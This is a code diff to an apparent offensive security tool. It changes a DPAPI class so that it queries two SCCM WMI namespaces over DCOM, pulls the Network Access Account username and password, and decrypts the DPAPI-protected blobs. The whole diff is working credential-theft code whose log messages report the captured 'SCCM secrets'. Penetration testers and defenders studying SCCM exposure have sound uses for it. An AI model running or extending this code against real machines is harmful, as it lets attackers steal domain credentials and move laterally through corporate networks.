@@ -57,7 +57,22 @@ class DPAPI:
 
    
     def run(self):
-        self.dump()
+        namespaces = [
+            'root\\ccm\\Policy\\Machine\\RequestedConfig',
+            'root\\ccm\\Policy\\Machine\\ActualConfig'
+        ]
+
+        for namespace in namespaces:
+            self.query(namespace)
+
+            if len(self.raw_sccm_blobs) == 0:
+                logger.info(f"[!] No SCCM secrets found in WMI namespace '{namespace}'")
+            else:
+                logger.info(f"[+] Got {str(len(self.raw_sccm_blobs))} SCCM secrets from WMI namespace '{namespace}'")
+                self.parseDPAPIBlob()
+                self.raw_sccm_blobs = []
+                logger.debug("[*] Exiting now as we have found SCCM secrets")
+                sys.exit(1)
 
     def addPolicySecret(self, secret):
         if secret.startswith("<PolicySecret"):
@@ -99,9 +114,8 @@ class DPAPI:
             userKey = userKey.split(':')[1]
             self.key = unhexlify(userKey[2:])
 
-    def dump(self):
+    def query(self, namespace):
         try:
-            namespace = 'root\\ccm\\Policy\\Machine\\RequestedConfig'
             query = 'SELECT NetworkAccessUsername,NetworkAccessPassword FROM CCM_NetworkAccessAccount'
             logger.info("[*] Querying SCCM configuration via WMI")
             logger.debug('[*] Establishing DCOM connection')
@@ -143,8 +157,6 @@ class DPAPI:
             iWbemServices.RemRelease()
             dcom.disconnect()
 
-
-
         except Exception as e:
             if type(e) is wmi.DCERPCSessionError and e.error_code == 0x8004100e:
                 logger.info("[!] CCM namespace not found, this usually means there is no SCCM configuration on the machine.")
@@ -155,13 +167,7 @@ class DPAPI:
             sys.exit(1)
         
 
-        if len(self.raw_sccm_blobs) == 0:
-            logger.info("[!] No SCCM secrets found")
-            sys.exit(1)
-        else:
-            logger.info("[+] Got " + str(len(self.raw_sccm_blobs)) + " SCCM secrets.")
-
-
+    def parseDPAPIBlob(self):
         try:
             self.__isRemote = True
             bootKey = None
